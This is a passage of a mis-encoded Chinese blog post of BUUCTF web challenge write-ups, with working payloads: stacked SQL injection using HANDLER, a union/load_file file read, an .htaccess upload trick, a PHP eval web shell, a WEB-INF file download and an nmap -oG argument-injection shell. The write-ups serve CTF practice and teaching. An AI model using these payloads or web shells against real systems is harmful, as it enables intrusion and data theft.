class="variable">$_GET</span>);</span><br><span class="line">	<span class="variable">$_COOKIE</span> = array_map(<span class="string">&#x27;stripslashes_deep&#x27;</span>, <span class="variable">$_COOKIE</span>);</span><br><span class="line">	<span class="variable">$_REQUEST</span> = array_map(<span class="string">&#x27;stripslashes_deep&#x27;</span>, <span class="variable">$_REQUEST</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysqli_query(<span class="variable">$con</span>,<span class="string">&#x27;SET NAMES UTF8&#x27;</span>);</span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pw&#x27;</span>];</span><br><span class="line"><span class="variable">$t_pw</span> = md5(<span class="variable">$password</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from user where username = &#x27;&quot;</span>.<span class="variable">$name</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">// echo $sql;</span></span><br><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$con</span>, <span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\(|\)|\=|or/&quot;</span>, <span class="variable">$name</span>))&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;do not hack me!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="variable">$result</span>) &#123;</span><br><span class="line">		printf(<span class="string">&quot;Error: %s\n&quot;</span>, mysqli_error(<span class="variable">$con</span>));</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="comment">// echo &#x27;&lt;pre&gt;&#x27;;</span></span><br><span class="line">		<span class="variable">$arr</span> = mysqli_fetch_row(<span class="variable">$result</span>);</span><br><span class="line">		<span class="comment">// print_r($arr);</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$arr</span>[<span class="number">1</span>] == <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">			<span class="keyword">if</span>(md5(<span class="variable">$password</span>) == <span class="variable">$arr</span>[<span class="number">2</span>])&#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">&quot;wrong pass!&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;wrong user!&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h4><h5 id="ä½¿ç”¨å †å æ³¨å…¥"><a href="#ä½¿ç”¨å †å æ³¨å…¥" class="headerlink" title="ä½¿ç”¨å †å æ³¨å…¥"></a>ä½¿ç”¨å †å æ³¨å…¥</h5><p>åˆ—æ•°2</p>
<p>return preg_match(â€œ/set|prepare|alter|rename|select|update|delete|drop|insert|where|./iâ€,$inject);</p>
<h5 id="descæŸ¥çœ‹è¡¨ç»“æ„çš„è¯¦ç»†ä¿¡æ¯"><a href="#descæŸ¥çœ‹è¡¨ç»“æ„çš„è¯¦ç»†ä¿¡æ¯" class="headerlink" title="descæŸ¥çœ‹è¡¨ç»“æ„çš„è¯¦ç»†ä¿¡æ¯"></a>descæŸ¥çœ‹è¡¨ç»“æ„çš„è¯¦ç»†ä¿¡æ¯</h5><p>åˆ°flagåˆ—ï¼Œæ¨æµ‹å…¶åº”ä¸ºflagï¼Œå°è¯•è·å–å…¶å†…å®¹ï¼Œä½†å› å…³é”®å­—selectè¢«é™åˆ¶ï¼ŒæŸ¥è¯¢èµ„æ–™å¾—çŸ¥HANDLERä¹Ÿå¯ä½œä¸ºæŸ¥è¯¢è¯­å¥ï¼Œä¸”æ€§èƒ½æ¯”selectæ›´å¥½ï¼Œå› ä¸ºå…¶ä¸ºéSQLæ ‡å‡†è¯­æ³•ï¼Œå¯ä»¥é™ä½ä¼˜åŒ–å™¨å¯¹äºSQLè¯­å¥çš„è§£æä¸ä¼˜åŒ–å¼€é”€ï¼Œä»è€Œæå‡æŸ¥è¯¢æ€§èƒ½ã€‚</p>
<p>å…·ä½“è¯­æ³•ï¼š</p>
<p>HANDLER tbl_name OPEN [ [AS] alias]<br>HANDLER tbl_name READ index_name { = | &lt;= | &gt;= | &lt; | &gt; } (value1,value2,â€¦) [ WHERE where_condition ] [LIMIT â€¦ ]<br>HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST } [ WHERE where_condition ] [LIMIT â€¦ ]<br>HANDLER tbl_name READ { FIRST | NEXT } [ WHERE where_condition ] [LIMIT â€¦ ]<br>HANDLER tbl_name CLOSE<br>HANDLERå¯ä»¥é€šè¿‡æŒ‡å®šçš„ç´¢å¼•å»è®¿é—®æ•°æ®ã€‚ä½†æ­¤è¯­æ³•å¹¶ä¸æ”¯æŒDMLæ“ä½œã€‚</p>
<p>å¯æ„é€ å¦‚ä¸‹çš„Payloadï¼š</p>
<p>å›æ˜¾å‡ºäº†é»‘åå•é™åˆ¶çš„å…³é”®å­—<br>æ²¡é™åˆ¶å…³é”®å­—<code>show</code>ï¼Œæ‰€ä»¥é€šè¿‡å †å æ³¨å…¥å…ˆæŸ¥çœ‹åº“åï¼š</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;show databases;#</span></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°ä¸¤ä¸ªè¡¨ï¼š<code>FlagHere</code>å’Œ<code>words</code>ï¼ŒæŸ¥è¯¢<code>FlagHere</code>è¡¨ä¸­è¯¦ç»†ç»“æ„ï¼š</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;desc FlagHere;</span></span><br></pre></td></tr></table></figure>

<p>1â€™;HANDLER FlagHere open;HANDLER FlagHere read first;HANDLER FlagHere close;#  ä¹Ÿå°±æ˜¯é€šè¿‡<strong>HANDLER</strong>ä»<code>FlagHere</code>è¡¨ä¸­ï¼Œè¯»å–ç¬¬ä¸€ä¸ªç´¢å¼•è®°å½•ï¼Œç„¶åå…³é—­ã€‚</p>
<p>é»‘åå•é™åˆ¶äº†éƒ¨åˆ†å…³é”®å­—ï¼Œå…¶ä¸­åŒ…å«æœ€ä¸»è¦çš„<code>SELECT</code>å…³é”®å­—ï¼Œé€šè¿‡å †å æ³¨å…¥çš„æ–¹å¼ï¼Œä½¿ç”¨<code>HANDLER</code>ä½œä¸ºæŸ¥è¯¢è¯­å¥ï¼Œè¯»å–<strong>flag</strong>ã€‚</p>
<h4 id="ç½‘é¼æ¯-2018-Fakebook-æœªè§£å…¨"><a href="#ç½‘é¼æ¯-2018-Fakebook-æœªè§£å…¨" class="headerlink" title="[ç½‘é¼æ¯ 2018]Fakebook(æœªè§£å…¨)"></a>[ç½‘é¼æ¯ 2018]Fakebook(æœªè§£å…¨)</h4><h5 id="å¾¡å‰‘æ‰«æï¼šçº¿ç¨‹1ï¼Œè¶…æ—¶30ï¼Œçº¿ç¨‹æ•°å¤ªå¤§ä¼šè¿”å›409ï¼Œè®¿é—®å¤ªå¤šã€‚"><a href="#å¾¡å‰‘æ‰«æï¼šçº¿ç¨‹1ï¼Œè¶…æ—¶30ï¼Œçº¿ç¨‹æ•°å¤ªå¤§ä¼šè¿”å›409ï¼Œè®¿é—®å¤ªå¤šã€‚" class="headerlink" title="å¾¡å‰‘æ‰«æï¼šçº¿ç¨‹1ï¼Œè¶…æ—¶30ï¼Œçº¿ç¨‹æ•°å¤ªå¤§ä¼šè¿”å›409ï¼Œè®¿é—®å¤ªå¤šã€‚"></a>å¾¡å‰‘æ‰«æï¼šçº¿ç¨‹1ï¼Œè¶…æ—¶30ï¼Œçº¿ç¨‹æ•°å¤ªå¤§ä¼šè¿”å›409ï¼Œè®¿é—®å¤ªå¤šã€‚</h5><p>æ‰¾åˆ°robots.txt,flag.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /user.php.bak</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$ch</span> = curl_init();</span><br><span class="line"></span><br><span class="line">â€‹    curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">â€‹    curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">â€‹    <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">â€‹    <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">â€‹    <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">â€‹        <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">â€‹    &#125;</span><br><span class="line">â€‹    curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">â€‹    <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$blog</span> = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºsqlæ³¨å…¥æ²¡æœ‰è¿‡æ»¤load_fileï¼Œç›´æ¥å–å¾—flagï¼Œéé¢„æœŸè§£ã€‚</p>
<p>?no=-1%20union/**/select%201,load_file(â€œ/var/www/html/flag.phpâ€),3,4#</p>
<h4 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h4><p>1.ä¸Šä¼ .htaccessæ–‡ä»¶ï¼Œ</p>
<p>AddType application/x-httpd-php .mochu</p>
<p>2.ä¸Šä¼ æ–‡ä»¶åä¸ºshell.mochu</p>
<script language="php">eval($_POST['mochu7']);</script>

<p>3.èšå‰‘è¿æ¥å³å¯</p>
<h4 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h4><p>åŸºç¡€çŸ¥è¯†</p>
<p>WEB-INF/web.xmlæ³„éœ²<br>WEB-INFæ˜¯Javaçš„WEBåº”ç”¨çš„å®‰å…¨ç›®å½•ã€‚å¦‚æœæƒ³åœ¨é¡µé¢ä¸­ç›´æ¥è®¿é—®å…¶ä¸­çš„æ–‡ä»¶ï¼Œå¿…é¡»é€šè¿‡web.xmlæ–‡ä»¶å¯¹è¦è®¿é—®çš„æ–‡ä»¶è¿›è¡Œç›¸åº”æ˜ å°„æ‰èƒ½è®¿é—®ã€‚WEB-INFä¸»è¦åŒ…å«ä¸€ä¸‹æ–‡ä»¶æˆ–ç›®å½•ï¼š      </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/WEB-INF/web.xmlï¼šWebåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™ã€‚</span><br><span class="line">/WEB-INF/classes/ï¼šå«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ class æ–‡ä»¶ï¼ŒåŒ…æ‹¬ servlet class å’Œéservlet classï¼Œä»–ä»¬ä¸èƒ½åŒ…å«åœ¨ .jaræ–‡ä»¶ä¸­    </span><br><span class="line">/WEB-INF/lib/ï¼šå­˜æ”¾webåº”ç”¨éœ€è¦çš„å„ç§JARæ–‡ä»¶ï¼Œæ”¾ç½®ä»…åœ¨è¿™ä¸ªåº”ç”¨ä¸­è¦æ±‚ä½¿ç”¨çš„jaræ–‡ä»¶,å¦‚æ•°æ®åº“é©±åŠ¨jaræ–‡ä»¶         </span><br><span class="line">/WEB-INF/src/ï¼šæºç ç›®å½•ï¼ŒæŒ‰ç…§åŒ…åç»“æ„æ”¾ç½®å„ä¸ªjavaæ–‡ä»¶ã€‚</span><br><span class="line">/WEB-INF/database.propertiesï¼šæ•°æ®åº“é…ç½®æ–‡ä»¶</span><br></pre></td></tr></table></figure>

<p>æ¼æ´æˆå› ï¼šé€šå¸¸ä¸€äº›webåº”ç”¨æˆ‘ä»¬ä¼šä½¿ç”¨å¤šä¸ªwebæœåŠ¡å™¨æ­é…ä½¿ç”¨ï¼Œè§£å†³å…¶ä¸­çš„ä¸€ä¸ªwebæœåŠ¡å™¨çš„æ€§èƒ½ç¼ºé™·ä»¥åŠåšå‡è¡¡è´Ÿè½½çš„ä¼˜ç‚¹å’Œå®Œæˆä¸€äº›åˆ†å±‚ç»“æ„çš„å®‰å…¨ç­–ç•¥ç­‰ã€‚åœ¨ä½¿ç”¨è¿™ç§æ¶æ„çš„æ—¶å€™ï¼Œç”±äºå¯¹é™æ€èµ„æºçš„ç›®å½•æˆ–æ–‡ä»¶çš„æ˜ å°„é…ç½®ä¸å½“ï¼Œå¯èƒ½ä¼šå¼•å‘ä¸€äº›çš„å®‰å…¨é—®é¢˜ï¼Œå¯¼è‡´web.xmlç­‰æ–‡ä»¶èƒ½å¤Ÿè¢«è¯»å–ã€‚æ¼æ´æ£€æµ‹ä»¥åŠåˆ©ç”¨æ–¹æ³•ï¼šé€šè¿‡æ‰¾åˆ°web.xmlæ–‡ä»¶ï¼Œæ¨æ–­classæ–‡ä»¶çš„è·¯å¾„ï¼Œæœ€åç›´æ¥classæ–‡ä»¶ï¼Œåœ¨é€šè¿‡åç¼–è¯‘classæ–‡ä»¶ï¼Œå¾—åˆ°ç½‘ç«™æºç ã€‚ä¸€èˆ¬æƒ…å†µï¼Œjspå¼•æ“é»˜è®¤éƒ½æ˜¯ç¦æ­¢è®¿é—®WEB-INFç›®å½•çš„ï¼ŒNginx é…åˆTomcatåšå‡è¡¡è´Ÿè½½æˆ–é›†ç¾¤ç­‰æƒ…å†µæ—¶ï¼Œé—®é¢˜åŸå› å…¶å®å¾ˆç®€å•ï¼ŒNginxä¸ä¼šå»è€ƒè™‘é…ç½®å…¶ä»–ç±»å‹å¼•æ“ï¼ˆNginxä¸æ˜¯jspå¼•æ“ï¼‰å¯¼è‡´çš„å®‰å…¨é—®é¢˜è€Œå¼•å…¥åˆ°è‡ªèº«çš„å®‰å…¨è§„èŒƒä¸­æ¥ï¼ˆè¿™æ ·è€¦åˆæ€§å¤ªé«˜äº†ï¼‰ï¼Œä¿®æ”¹Nginxé…ç½®æ–‡ä»¶ç¦æ­¢è®¿é—®WEB-INFç›®å½•å°±å¥½äº†ï¼š location ~ ^/WEB-INF/* { deny all; } æˆ–è€…return 404; æˆ–è€…å…¶ä»–ï¼</p>
<p>ç‚¹å‡»helpï¼Œå¯ä»¥å¾—åˆ°java.io.FileNotFoundException:{help.docx}ï¼Œç½‘å€/Download?filename=help.docx</p>
<p>postæäº¤ï¼šfilename=WEB-INF/web.xml å¯ä»¥å¾—åˆ°Webåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-<span class="class"><span class="keyword">class</span>&gt;<span class="title">com</span>.<span class="title">wm</span>.<span class="title">ctf</span>.<span class="title">FlagController</span>&lt;/<span class="title">servlet</span>-<span class="title">class</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">servlet</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>postæäº¤ï¼šfilename=WEB-INF/classes/com/wm/ctf/FlagController.class</p>
<p>å¾—åˆ°WEB-INF_classes_com_wm_ctf_FlagController.class</p>
<p>å°†æ–‡ä»¶ç”¨jd-guiæ‰“å¼€å¯ä»¥å‘ç°base64ä¸²ï¼ŒZmxhZ3sxMWZlYmU4ZS1iNjk2LTQ4YjQtOWI1Zi01OWNlZTljOGQ5NDN9Cg==</p>
<p>base64è§£å¯†å³å¯è·å¾—flagã€‚</p>
<h4 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">  <span class="variable">$host</span> = escapeshellarg(<span class="variable">$host</span>);</span><br><span class="line">  <span class="variable">$host</span> = escapeshellcmd(<span class="variable">$host</span>);</span><br><span class="line">  <span class="variable">$sandbox</span> = md5(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">  @mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">  chdir(<span class="variable">$sandbox</span>);</span><br><span class="line">  <span class="keyword">echo</span> system(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">remote_addrå’Œx_forwarded_forè¿™ä¸¤ä¸ªæ˜¯è§çš„æ¯”è¾ƒå¤šçš„ï¼ŒæœåŠ¡å™¨è·å–ipç”¨çš„ï¼Œè¿™é‡Œæ²¡ä»€ä¹ˆç”¨</span><br><span class="line"></span><br><span class="line">ä¼ å…¥çš„å‚æ•°æ˜¯ï¼š<span class="number">172.17</span>.<span class="number">0.2</span><span class="string">&#x27; -v -d a=1</span></span><br><span class="line"><span class="string">ç»è¿‡escapeshellargå¤„ç†åå˜æˆäº†&#x27;</span><span class="number">172.17</span>.<span class="number">0.2</span><span class="string">&#x27;\&#x27;&#x27;</span> -v -d a=<span class="number">1</span><span class="string">&#x27;ï¼Œå³å…ˆå¯¹å•å¼•å·è½¬ä¹‰ï¼Œå†ç”¨å•å¼•å·å°†å·¦å³ä¸¤éƒ¨åˆ†æ‹¬èµ·æ¥ä»è€Œèµ·åˆ°è¿æ¥çš„ä½œç”¨ã€‚</span></span><br><span class="line"><span class="string">ç»è¿‡escapeshellcmdå¤„ç†åå˜æˆ&#x27;</span><span class="number">172.17</span>.<span class="number">0.2</span><span class="string">&#x27;\\&#x27;</span><span class="string">&#x27; -v -d a=1\&#x27;ï¼Œè¿™æ˜¯å› ä¸ºescapeshellcmdå¯¹\ä»¥åŠæœ€åé‚£ä¸ªä¸é…å¯¹å„¿çš„å¼•å·è¿›è¡Œäº†è½¬ä¹‰ï¼šhttp://php.net/manual/zh/function.escapeshellcmd.php</span></span><br><span class="line"><span class="string">æœ€åæ‰§è¡Œçš„å‘½ä»¤æ˜¯curl &#x27;</span><span class="number">172.17</span>.<span class="number">0.2</span><span class="string">&#x27;\\&#x27;</span><span class="string">&#x27; -v -d a=1\&#x27;ï¼Œç”±äºä¸­é—´çš„\\è¢«è§£é‡Šä¸º\è€Œä¸å†æ˜¯è½¬ä¹‰å­—ç¬¦ï¼Œæ‰€ä»¥åé¢çš„&#x27;</span>æ²¡æœ‰è¢«è½¬ä¹‰ï¼Œä¸å†åé¢çš„<span class="string">&#x27;é…å¯¹å„¿æˆäº†ä¸€ä¸ªç©ºç™½è¿æ¥ç¬¦ã€‚æ‰€ä»¥å¯ä»¥ç®€åŒ–ä¸ºcurl 172.17.0.2\ -v -d a=1&#x27;</span>ï¼Œå³å‘<span class="number">172.17</span>.<span class="number">0.2</span>\å‘èµ·è¯·æ±‚ï¼ŒPOST æ•°æ®ä¸ºa=<span class="number">1</span><span class="string">&#x27;ã€‚</span></span><br></pre></td></tr></table></figure>

<p>è¿™æ—¶å€™å°±åªæœ‰æƒ³æƒ³èƒ½ä¸èƒ½åˆ©ç”¨nmapæ¥åšäº›ä»€ä¹ˆäº†ã€‚</p>
<p>è¿™æ—¶å€™æœç´¢å¯ä»¥å‘ç°åœ¨nmapå‘½ä»¤ä¸­ æœ‰ä¸€ä¸ªå‚æ•°-oGå¯ä»¥å®ç°å°†å‘½ä»¤å’Œç»“æœå†™åˆ°æ–‡ä»¶</p>
<p>è¿™ä¸ªå‘½ä»¤å°±æ˜¯æˆ‘ä»¬çš„è¾“å…¥å¯æ§ï¼ç„¶åå†™å…¥åˆ°æ–‡ä»¶ï¼OKå¾ˆè‡ªç„¶çš„æƒ³åˆ°äº†ä¸Šä¼ ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬äº†â€¦</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=<span class="string">&#x27; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#x27;</span></span><br></pre></td></tr></table></figure>

<p>è¿æ¥åhackçš„å†…å®¹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># Nmap 7.70 scan initiated Sat May 28 08:47:22 2022 as: nmap -T5 -sT -Pn --host-timeout 2 -F -oG hack.php \ &lt;?php @eval($_POST[hack]);?&gt; \\</span><br><span class="line"></span><br><span class="line"># Nmap done at Sat May 28 08:47:23 2022 -- 0 IP addresses (0 hosts up) scanned in 1.28 seconds</span><br></pre></td></tr></table></figure>

<p>è¿æ¥å³å¯è·å¾—flag</p>
</a></----->
    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/buuoj%E5%B9%B3%E5%8F%B0/" rel="tag"># buuojå¹³å°</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2022/05/22/%E5%8D%95%E8%BA%AB%E6%9D%AF/" rel="prev" title="å•èº«æ¯">
      <i class="fa fa-chevron-left"></i> å•èº«æ¯
    </a></div>
      <div class="post-nav-item"></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
